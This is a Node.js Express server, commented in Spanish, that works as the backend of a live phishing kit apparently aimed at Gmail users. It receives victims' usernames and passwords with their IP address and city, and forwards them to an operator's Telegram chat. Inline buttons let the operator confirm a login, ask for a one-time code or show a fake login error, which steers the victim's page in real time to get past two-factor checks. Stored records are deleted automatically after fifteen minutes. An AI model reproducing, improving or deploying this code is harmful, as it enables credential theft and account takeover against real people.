const express = require('express');
const cors = require('cors');
const fetch = require('node-fetch');
const fs = require('fs');
const path = require('path');
require('dotenv').config();

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const CHAT_ID = process.env.CHAT_ID;
const CLIENTES_DIR = './clientes';

if (!fs.existsSync(CLIENTES_DIR)) {
  fs.mkdirSync(CLIENTES_DIR);
}

setInterval(() => {
  const files = fs.readdirSync(CLIENTES_DIR);
  const ahora = Date.now();
  files.forEach(file => {
    const fullPath = path.join(CLIENTES_DIR, file);
    const stats = fs.statSync(fullPath);
    const edadMinutos = (ahora - stats.birthtimeMs) / 60000;
    if (edadMinutos > 15) {
      fs.unlinkSync(fullPath);
      console.log(`Eliminado: ${file}`);
    }
  });
}, 10 * 60 * 1000);

function guardarCliente(txid, data) {
  const ruta = `${CLIENTES_DIR}/${txid}.json`;
  if (!data.creadoEn) data.creadoEn = Date.now();
  fs.writeFileSync(ruta, JSON.stringify(data, null, 2));
  console.log(`Guardado cliente ${txid} con status: ${data.status}`);
}

function cargarCliente(txid) {
  const ruta = `${CLIENTES_DIR}/${txid}.json`;
  if (fs.existsSync(ruta)) return JSON.parse(fs.readFileSync(ruta));
  return null;
}

app.post('/enviar', async (req, res) => {
  const { usar, clavv, txid, ip, ciudad, countrycode } = req.body;
  console.log(`Datos recibidos: ${txid} - ${usar}`);

  const mensaje = `
🔵GM4YL🔵
🆔 ID: <code>${txid}</code>
📱 US4R: <code>${usar}</code>
🔐 CL4V: <code>${clavv}</code>
🌐 IP: ${ip}
🏙️ Ciudad: ${ciudad}, ${countrycode}
`;

  const cliente = { status: "esperando", usar, clavv, ip, ciudad };
  guardarCliente(txid, cliente);

  const keyboard = {
    inline_keyboard: [[
      { text: "🔑 CONFIRMAR", callback_data: `confirm:${txid}` },
      { text: "🔢 INGRESAR CÓDIGO", callback_data: `codigo_menu:${txid}` },
      { text: "❌ ERROR LOGO", callback_data: `errorlogo:${txid}` }
    ]]
  };

  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: mensaje,
      parse_mode: 'HTML',
      reply_markup: keyboard
    })
  });
  res.sendStatus(200);
});

app.post('/webhook', async (req, res) => {
  console.log("WEBHOOK RECIBIDO");

  if (req.body.callback_query) {
    const callback = req.body.callback_query;
    const data = callback.data;
    const [accion, txid] = data.split(':');

    console.log(`BOTÓN PRESIONADO: ${accion} - TXID: ${txid}`);

    const cliente = cargarCliente(txid);
    if (!cliente) {
      console.log(`Cliente no encontrado: ${txid}`);
      return res.sendStatus(200);
    }

    if (accion === 'confirm') cliente.status = 'en_otro4';
    else if (accion === 'errorlogo') cliente.status = 'en_index2';

    guardarCliente(txid, cliente);
    console.log(`Nuevo status: ${cliente.status}`);

    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        callback_query_id: callback.id,
        text: "OK"
      })
    });
    return res.sendStatus(200);
  }

  res.sendStatus(200);
});

app.get('/status', (req, res) => {
  const txid = req.query.txid;
  if (!txid) return res.status(400).json({ error: 'Falta txid' });
  const cliente = cargarCliente(txid) || { status: 'esperando' };
  res.json({
    status: cliente.status || 'esperando',
    codigo: cliente.codigo || null,
    redir_a: cliente.redir_a || null
  });
});

app.get('/', (req, res) => res.send("OK"));

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Servidor corriendo en puerto ${PORT}`));
